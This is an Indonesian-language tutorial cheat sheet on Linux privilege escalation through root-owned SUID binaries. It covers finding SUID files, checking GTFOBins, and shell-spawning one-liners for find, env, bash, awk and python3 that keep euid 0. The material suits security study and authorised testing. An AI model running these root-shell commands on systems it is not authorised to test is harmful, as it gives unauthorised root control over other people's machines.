# 🔑 Exploiting SUID (Set User ID Privilege Escalation)

> **Tujuan:** Memanfaatkan binary ber‑SUID milik **root** untuk mempertahankan **effective UID (euid=0)** dan mendapatkan shell sebagai **root**.

---

## 📌 Penjelasan Singkat

**SUID (Set User ID)** adalah bit permission pada file Unix/Linux yang menyebabkan file dieksekusi dengan **effective UID** pemilik file. Jika binary SUID dimiliki **root** dan dapat disalahgunakan, attacker dapat memperoleh **root shell**.

---

## 🛡️ Cari Binary SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# Mencari semua file yang memiliki SUID bit
```

Contoh output:

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/bin/vim
/usr/bin/python3
```

---

## 🧪 Cek GTFOBins

Untuk tiap binary → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **SUID** untuk melihat apakah binary tersebut dapat disalahgunakan.

---

## 💥 Pola Umum Eksploitasi

```bash
./binary -p ...                       # -p mempertahankan euid
env /bin/sh -p                        # SUID env
bash -p                               # SUID bash
find . -exec /bin/sh -p \; -quit      # SUID find
awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk)
```

| Binary | Teknik | Catatan |
|--------|--------|---------|
| `find` | `-exec /bin/sh` | Shell dijalankan dengan euid |
| `env` | `/bin/sh -p` | Preserve euid via env |
| `bash` | `-p` | Mempertahankan euid |
| `awk`/`mawk` | `system("/bin/sh")` | Menjalankan command |
| `python3` | `os.system("/bin/sh")` | Spawn shell via Python |

---

## ⚠️ Catatan Penting — Privilege Drop

Payload yang menggunakan `system()` → `/bin/sh` (dash) dapat **menurunkan privilege**.

### Solusi

- Gunakan binary yang melakukan `execve` langsung (`env`, `find`).
- Atau gunakan **`/bin/bash -p`** untuk mempertahankan euid.

> Beberapa shell seperti `dash` otomatis menurunkan privilege. Karena itu, shell yang digunakan harus mempertahankan **effective UID** agar privilege SUID tidak hilang.

---

## 🪜 Alur Eksploitasi

```text
Cari SUID
    ↓
Identifikasi binary
    ↓
Cek GTFOBins → SUID
    ↓
Validasi permission & konfigurasi
    ↓
Uji teknik yang sesuai
    ↓
Verifikasi privilege dengan id
```

---

## 📋 Checklist SUID LPE

- [ ] Jalankan `find / -perm -4000 -type f 2>/dev/null`.
- [ ] Identifikasi binary SUID milik root.
- [ ] Cek di [GTFOBins](https://gtfobins.github.io) → bagian **SUID**.
- [ ] Pilih teknik yang tepat (`-p`, `exec`, `system`, dll.).
- [ ] Uji payload dan pastikan euid tetap 0.
- [ ] Verifikasi dengan `id` → `uid=0(root) euid=0(root)`.

---

## 📚 Referensi

- [GTFOBins – SUID](https://gtfobins.github.io/)
- [Linux Man Page – SUID](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
